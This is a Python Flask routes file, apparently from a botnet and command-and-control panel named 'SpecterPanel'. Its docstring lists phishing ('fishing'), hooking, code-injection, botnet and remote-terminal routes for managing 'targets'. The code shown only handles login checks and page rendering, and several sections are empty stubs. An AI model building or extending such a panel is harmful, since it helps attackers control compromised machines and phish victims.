# -*- coding: utf-8 -*-
"""
SpecterPanel - View Routes
This module defines the view routes for the SpecterPanel application.
These routes handle user interactions with the web interface,
including dashboard, API commands, API links, fishing, hooking, and settings.
It uses Flask's Blueprint to organize the routes and render templates.
It also includes error handling and session management.
It provides functionality for managing API commands, links, and user settings.
It requires user authentication for most routes and redirects to login if the user is not authenticated.
It also includes functionality for checking command updates and deleting commands.
It uses SQLAlchemy for database interactions and JSON files for data storage.
         Routes:
            - /dashboard: Displays the user's dashboard with targets.
            - /api_command/<targetName>: Handles API command operations for a specific target.
            - /check_commads_updates/<target_name>: Checks for updates to API commands for a given target.
            - /api_command/delete: Deletes an API command for a given target and command ID.
            - /api_command/api/<targetName>: Returns all API commands for the given target and logged-in user.
            - /socket/<target_name>: Renders the socket page for a specific target.
            - /api_link: Manages API links for the logged-in user.
            - /api_link_delete/<ID>: Deletes an API link by its ID for the logged-in user.
            - /api_link_update/<ID>: Updates an existing API link by its ID.
            - /fishing: Renders the fishing page for the logged-in user.
            - /hooking: Renders the hooking page for the logged-in user.
            - /code: Renders the code page for the logged-in user.
            - /settings: Renders the settings page for the logged-in user.
        Route info:
            - Each route checks if the user is authenticated by checking the session.
            - If the user is not authenticated, they are redirected to the login page.
            - The routes handle both GET and POST requests as needed.
            - The routes use SQLAlchemy to query the database and retrieve necessary data. 
            - The routes render HTML templates using Flask's render_template function.
            - The routes handle exceptions and log errors using a custom log function.
        Route usage:
            - Users can access the dashboard to view their targets and API commands.
            - Users can execute API commands for specific targets and view command history.
            - Users can manage API links and delete or update them as needed.
            - Users can access the fishing and hooking pages for additional functionality.
            - Users can view and update their settings.
"""

import traceback
import bcrypt
from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
from sqlalchemy.orm import sessionmaker
from urllib.parse import unquote

from db.modle import Users, APICommand, APILink, Targets, Instraction, ApiToken, Instruction_Detail, BotNet
from db.mange_db import config, _create_engine
from utility.email_temp import EmailTemplate
from utility.processer import log, getlist, readFromJson, delete_data


Session = sessionmaker(bind=_create_engine())
_session = Session()

view = Blueprint("view", __name__, template_folder="templates")


@view.route("/dashboard")
def dashboard():
    """
    Render the dashboard page for the logged-in user.
    Displays targets associated with the user's email.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            email = session['email']
            print(email)
            targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
            _targets = []
            for target in targets:
                target_ = readFromJson('target-info',target[1])
                print(target_)
                if '127.0.0.1' in target_['ip']:
                    conn = 'local'
                elif '192.168' in target_['ip']:
                    conn = 'wifi'
                else:
                    # , mdi mdi-ethernet-cable
                    conn = 'ethernet'
                _targets.append((target_, conn, target[1]))

            if request.method != 'GET':
                return redirect(url_for('event.page_404'))
            return render_template('dashboard.html', targets=_targets)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


# -------------------------------------web terminal-------------------------------------
    
# -------------------------------------------------------------------------------

@view.route("/socket/<target_name>")
def socket_page(target_name):
    """
    Render the socket page for a specific target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0][1]
            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
            if len(targets) != 0 and len(token) != 0:
                return render_template('socket.html', target_name=target_name,token=token)
            else:
                flash(f'No such a target {target_name}')
                return redirect(request.referrer)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


# -----------------------------------botNet management-----------------------------------
    
#----------------------------------------------------------------------------------------


#------------------------------code injection--------------------------------------------

#----------------------------------------------------------------------------------------

# --------------------------------------Setting------------------------------------------

#----------------------------------------------------------------------------------------
# -*- coding: utf-8 -*-
